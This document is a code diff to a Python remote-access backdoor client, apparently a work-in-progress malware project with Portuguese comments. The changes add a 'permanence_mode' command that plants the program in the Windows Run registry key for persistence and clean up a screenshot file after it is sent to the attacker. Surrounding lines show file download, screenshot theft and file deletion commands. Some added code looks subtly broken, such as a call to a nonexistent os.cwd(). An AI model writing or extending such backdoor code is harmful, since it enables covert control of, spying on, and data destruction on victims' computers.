@@ -9,14 +9,11 @@ import pyautogui
 import time
 # from pynput.keyboard import Key, Listener
 
-if sys.platform.startswith("Windows"):
-    import winreg as reg
-
-
 ### Client
 class Backdoor:
     keys_list = []
     count = 0
+    program_name = os.path.basename(__file__)
     def __init__(self, host, port):
         # Font: Chuncky
 
@@ -107,8 +104,11 @@ class Backdoor:
                             self.sock.send(str(e).encode())
 
                                 
-                                    
-
+                    if message_command_descrypt == "permanence_mode":
+                        import winreg as reg
+                        key = reg.OpenKey(reg.HKEY_CURRENT_USER,'Software\Microsoft\Windows\CurrentVersion\Run', reg.KEY_SET_VALUE)
+                        reg.SetValueEx(key,"pmpy",0,reg.REG_BINARY,f'{os.cwd()}/{self.program_name}')
+                        key.Close()
                     # Downloading files
 
                     if message_command_descrypt.startswith("download "):
@@ -121,7 +121,6 @@ class Backdoor:
                             self.sock.send(screenshot_data)
                         print("Transference Done!")
                     
-                            
 
                     # This is for removing all files in currently path, maybe not work in folders that requires admin credentials
 
@@ -173,6 +172,7 @@ class Backdoor:
                         with open("screenshot.png","rb") as sc:
                             screenshot_data = sc.read()
                             self.sock.send(screenshot_data)
+                        os.remove("screenshot.png") # para remover a imagem, testar
                             
 
                     # Upload File ta executando como comando no termianl.. mudar para if, sel
@@ -250,19 +250,6 @@ class Backdoor:
 
                 #if message_command_descrypt == "rm":
                     #self.sock.send("You must specify a file".encode())
-
-
-                """if message_command_descrypt.startswith("win_startup"):
-
-                    try:
-                        back.winreg(file_name, pth)
-
-                        # Send OK To Attacker
-                        self.sock.send("OK".encode('utf-8'))
-
-                    # If Failed, Send Exception Message To Attacker
-                    except Exception as e:
-                        self.sock.send(str(e).encode())"""
 
             except BrokenPipeError:
                 print("\n\033[1;31m[!]\033[0;0m Connection Reseted! Exiting...")
